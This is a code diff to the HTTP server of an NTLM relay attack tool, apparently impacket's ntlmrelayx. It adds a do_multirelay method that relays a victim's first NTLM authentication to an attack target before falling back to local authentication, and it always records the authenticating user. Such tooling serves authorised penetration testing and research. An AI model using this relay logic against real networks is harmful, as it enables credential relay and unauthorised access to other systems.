@@ -213,13 +213,7 @@ class HTTPRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                # We can start the relay process
-                self.do_relay(messageType, token, proxy, content)
+            self.do_multirelay(messageType, token, proxy, content)
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -298,15 +292,28 @@ class HTTPRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                # We can start the relay process
-                self.do_relay(messageType, token, proxy)
+            self.do_multirelay(messageType, token, proxy)
 
             return
+
+        def do_multirelay(self, messageType, token, proxy, content=None):
+            if self.server.config.disableMulti or self.relayToHost:
+                return self.do_relay(messageType, token, proxy, content)
+
+            # The username is not available until the AUTHENTICATE_MESSAGE. If an
+            # unrestricted target exists, use its challenge for the first
+            # authentication instead of spending that authentication locally.
+            if messageType == 1:
+                self.target = self.server.config.target.getTarget()
+                if self.target is not None:
+                    LOG.info("(HTTP): Received connection from %s, attacking target %s://%s before identity discovery" %
+                             (self.client_address[0], self.target.scheme, self.target.netloc))
+                    self.relayToHost = True
+                    return self.do_relay(messageType, token, proxy, content)
+
+            # No unrestricted target is available. Authenticate locally so the
+            # identity can be used to select a username-bound target.
+            return self.do_local_auth(messageType, token, proxy)
 
         def do_ntlm_negotiate(self, token, proxy):
             if self.target.scheme.upper() in self.server.config.protocolClients:
@@ -454,9 +461,9 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
+                self.authUser = authenticateMessage.getUserString()
 
                 if self.server.config.disableMulti:
-                    self.authUser = authenticateMessage.getUserString()
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
                 if not self.do_ntlm_auth(token, authenticateMessage):
